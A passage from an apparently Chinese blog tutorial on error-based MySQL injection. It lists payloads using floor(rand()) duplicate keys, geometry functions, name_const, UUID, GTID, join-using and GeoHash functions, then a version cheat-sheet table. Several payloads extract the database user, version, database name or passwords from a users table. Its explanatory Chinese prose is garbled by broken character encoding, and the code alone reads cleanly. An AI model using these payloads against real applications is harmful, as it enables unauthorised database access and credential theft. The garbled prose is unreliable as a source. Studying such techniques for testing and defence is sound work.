<p>ç¬¬ä¸‰æ¬¡æ‰§è¡Œ<code>group by</code>æ—¶ï¼Œ<code>floor(rand(0)*2)</code>è¢«æ‰§è¡Œç¬¬å››æ¬¡ï¼Œå¾—åˆ°ç»“æœ 0ï¼ŒæŸ¥è¯¢è™šè¡¨ä¸å­˜åœ¨ã€‚å†æ’å…¥è™šè¡¨æ—¶ï¼Œ<code>floor(â€¦)</code>è¢«æ‰§è¡Œç¬¬äº”æ¬¡ï¼Œå¾—åˆ°ç»“æœ 1ï¼Œæ•…æ­¤æ—¶è™šè¡¨å°†æ’å…¥çš„å€¼ä¸º<code>key=1&amp;count=1</code>ï¼Œæ³¨æ„ï¼Œæ­¤æ—¶è™šè¡¨å·²æœ‰ä¸€æ¡è®°å½•ä¸ºï¼š<code>key=1&amp;count=2</code>ï¼Œå¹¶ä¸”å­—æ®µ key ä¸ºä¸»é”®ï¼Œå…·æœ‰ä¸å¯é‡å¤æ€§ï¼Œæ•…è™šè¡¨åœ¨å°è¯•æ’å…¥æ—¶å°†äº§ç”Ÿé”™è¯¯</p>
<hr>
<p>æ•…å¯ä½œ payloadï¼š<code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p>
<p><img src="https://i.loli.net/2021/04/26/zfHIm7y31G5MsZU.png"></p>
<p><code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code></p>
<p><img src="https://i.loli.net/2021/04/26/R6EMWit5lazIePC.png"></p>
<h3 id="åˆ©ç”¨å‡ ä½•å‡½æ•°"><a href="#åˆ©ç”¨å‡ ä½•å‡½æ•°" class="headerlink" title="åˆ©ç”¨å‡ ä½•å‡½æ•°"></a>åˆ©ç”¨å‡ ä½•å‡½æ•°</h3><ul>
<li>GeometryCollectionï¼š<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li>
<li>polygonï¼š<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li>
<li>multipointï¼š<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li>
<li>multilinestringï¼š<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li>
<li>linestringï¼š<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li>
<li>multipolygonï¼š<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li>
</ul>
<h3 id="åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°"><a href="#åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°" class="headerlink" title="åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°"></a>åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°</h3><p>éšä¾¿ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œå¯èƒ½ä¼šæ‘¸å¥–å¾—åˆ°å½“å‰æ‰€åœ¨çš„æ•°æ®åº“åç§°</p>
<p><img src="https://i.loli.net/2021/04/26/UCKcN46HYWITbBu.png"></p>
<h3 id="åˆ©ç”¨-name-const"><a href="#åˆ©ç”¨-name-const" class="headerlink" title="åˆ©ç”¨ name_const"></a>åˆ©ç”¨ name_const</h3><p>ä»…å¯å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯</p>
<p>payloadï¼š<code>select * from(select name_const(version(),0x1),name_const(version(),0x1))a</code></p>
<p><img src="https://i.loli.net/2021/04/26/XhTW5evptx8EHnC.png"></p>
<h3 id="uuid-ç›¸å…³å‡½æ•°"><a href="#uuid-ç›¸å…³å‡½æ•°" class="headerlink" title="uuid ç›¸å…³å‡½æ•°"></a>uuid ç›¸å…³å‡½æ•°</h3><p>é€‚ç”¨ç‰ˆæœ¬ï¼š8.0.x</p>
<p>because of å‚æ•°æ ¼å¼ä¸æ­£ç¡®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT UUID_TO_BIN((SELECT password FROM users WHERE id&#x3D;1));<br>SELECT BIN_TO_UUID((SELECT password FROM users WHERE id&#x3D;1));<br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªğŸ‘´è¿˜æ²¡æµ‹</p>
<h3 id="GTID-ç›¸å…³å‡½æ•°"><a href="#GTID-ç›¸å…³å‡½æ•°" class="headerlink" title="GTID ç›¸å…³å‡½æ•°"></a>GTID ç›¸å…³å‡½æ•°</h3><p>åŒæ ·ä¹Ÿæ˜¯å‚æ•°æ ¼å¼ä¸æ­£ç¡®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select gtid_subset(user(),1);<br>select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);<br>select gtid_subtract((select * from(select user())a),1);<br></code></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png"></p>
<h3 id="join-using-æ³¨åˆ—å"><a href="#join-using-æ³¨åˆ—å" class="headerlink" title="join using æ³¨åˆ—å"></a>join using æ³¨åˆ—å</h3><p>é€šè¿‡ç³»ç»Ÿå…³é”®è¯ join å¯å»ºç«‹ä¸¤ä¸ªè¡¨ä¹‹é—´çš„å†…è¿æ¥ï¼Œé€šè¿‡å¯¹æƒ³è¦æŸ¥è¯¢åˆ—åçš„è¡¨ä¸å…¶è‡ªèº«å»ºç«‹å†…è¿æ¥ï¼Œä¼šç”±äºå†—ä½™çš„åŸå› ï¼ˆç›¸åŒåˆ—åå­˜åœ¨ï¼‰è€Œå‘ç”Ÿé”™è¯¯ï¼Œå¹¶ä¸”æŠ¥é”™ä¿¡æ¯ä¼šå­˜åœ¨é‡å¤çš„åˆ—åï¼Œå¯ä»¥ä½¿ç”¨ USING è¡¨è¾¾å¼å£°æ˜å†…è¿æ¥ï¼ˆINNER JOINï¼‰æ¡ä»¶æ¥é¿å…æŠ¥é”™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from(select * from users a join (select * from users)b)c;<br>select * from(select * from users a join (select * from users)b using(username))c;<br>select * from(select * from users a join (select * from users)b using(username,password))c<br></code></pre></td></tr></table></figure>

<p>ğŸ‘´ä¸å’‹æ‡‚ï¼Œå¸Œæœ›å“ªä½SQLğŸ‘´å¯ä»¥å¸¦å¸¦ğŸ‘´</p>
<h3 id="ST-ç›¸å…³å‡½æ•°"><a href="#ST-ç›¸å…³å‡½æ•°" class="headerlink" title="ST ç›¸å…³å‡½æ•°"></a>ST ç›¸å…³å‡½æ•°</h3><p>MySQL 5.7</p>
<ul>
<li><code>select ST_LatFromGeoHash(version());</code></li>
<li><code>select ST_LongFromGeoHash(version());</code></li>
<li><code>select ST_PointFromGeoHash(version(),1);</code></li>
</ul>
<hr>
<h3 id="æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨"><a href="#æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨" class="headerlink" title="æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨"></a>æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨</h3><p>æ³¨ï¼šé»˜è®¤MYSQL_ERRMSG_SIZE=512</p>
<table>
<thead>
<tr>
<th>ç±»åˆ«</th>
<th>å‡½æ•°</th>
<th>ç‰ˆæœ¬éœ€æ±‚</th>
<th>5.5.x</th>
<th>5.6.x</th>
<th>5.7.x</th>
<th>8.x</th>
<th>å‡½æ•°æ˜¾é”™é•¿åº¦</th>
<th>MysqlæŠ¥é”™å†…å®¹é•¿åº¦</th>
<th>é¢å¤–é™åˆ¶</th>
</tr>
</thead>
<tbody><tr>
<td>ä¸»é”®é‡å¤</td>
<td>floor round</td>
<td>â“</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td></td>
<td>64</td>
<td></td>
<td>data_type â‰  varchar</td>
</tr>
<tr>
<td>åˆ—åé‡å¤</td>
<td>name_const</td>
<td>â“</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td></td>
<td></td>
<td>only version()</td>
</tr>
<tr>
<td></td>
<td>join</td>
<td>[5.5.49, ?)</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td></td>
<td></td>
<td>only columns</td>
</tr>
<tr>
<td>æ•°æ®æº¢å‡º - Double</td>
<td>1e308 cot exp pow</td>
<td>[5.5.5, 5.5.48]</td>
<td>âœ”ï¸</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>MYSQL_ERRMSG_SIZE</td>
<td></td>
</tr>
<tr>
<td>æ•°æ®æº¢å‡º - BIGINT</td>
<td></td>
<td>[5.5.5, 5.5.48]</td>
<td>âœ”ï¸</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>MYSQL_ERRMSG_SIZE</td>
<td></td>
</tr>
<tr>
<td>å‡ ä½•å¯¹è±¡</td>
<td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td>
<td>[?, 5.5.48]</td>
<td>âœ”ï¸</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>244</td>
<td></td>
</tr>
<tr>
<td>ç©ºé—´å‡½æ•° Geohash</td>
<td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td>
<td>[5.7, ?)</td>
<td></td>
<td></td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>128</td>
<td></td>
<td></td>
</tr>
<tr>
<td>GTID</td>
<td>gtid_subset gtid_subtract</td>
<td>[5.6.5, ?)</td>
<td></td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>200</td>
<td></td>
<td></td>
</tr>
<tr>
<td>JSON</td>
<td>json_*</td>
<td>[5.7.8, 5.7.11]</td>
<td></td>
<td></td>
<td>âœ”ï¸</td>
<td></td>
<td>200</td>
<td></td>
<td></td>
</tr>
<tr>
<td>UUID</td>
<td>uuid_to_bin bin_to_uuid</td>
<td>[8.0, ?)</td>
<td></td>
<td></td>
<td></td>
<td>âœ”ï¸</td>
<td>128</td>
<td></td>
<td></td>
</tr>
<tr>
<td>XPath</td>
<td>extractvalue updatexml</td>
<td>[5.1.5, ?)</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>âœ”ï¸</td>
<td>32</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<blockquote>
<p>æ‘˜è‡ªâ€”â€”<a target="_blank" rel="noopener" href="https://blog.sari3l.com/posts/9622f295/">Mysql æ³¨å…¥åŸºç¡€å°ç»“</a></p>
</blockquote>
<hr>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">åˆ¤æ–­ column æ•°åŠå›æ˜¾æ•°æ®å­—æ®µä½ç½®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">çˆ†åº“ã€è¡¨ã€å­—æ®µ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">åˆ©ç”¨ overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bigint-%E6%95%B0%E5%80%BC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">bigint æ•°å€¼æ“ä½œ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">åˆ©ç”¨ xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (é•¿åº¦é™åˆ¶32ä½)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (é•¿åº¦é™åˆ¶32ä½)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">åˆ©ç”¨è™šæ‹Ÿè¡¨æŠ¥é”™ &#x2F; ä¸»é”®é‡å¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">åˆ©ç”¨å‡ ä½•å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">åˆ©ç”¨ä¸å­˜åœ¨çš„å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-name-const"><span class="toc-number">1.2.6.</span> <span class="toc-text">åˆ©ç”¨ name_const</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uuid-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">uuid ç›¸å…³å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.8.</span> <span class="toc-text">GTID ç›¸å…³å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="toc-number">1.2.9.</span> <span class="toc-text">join using æ³¨åˆ—å</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.10.</span> <span class="toc-text">ST ç›¸å…³å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.2.11.</span> <span class="toc-text">æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&text=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=å°è°ˆSQLæ³¨å…¥&body=Check out this article: http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&title=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&name=å°è°ˆSQLæ³¨å…¥&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&t=å°è°ˆSQLæ³¨å…¥"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021
    Du1
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">links</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
        
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
         <span id="busuanzi_container_site_pv">æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡</span>
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.2/css/all.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.bootcdn.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
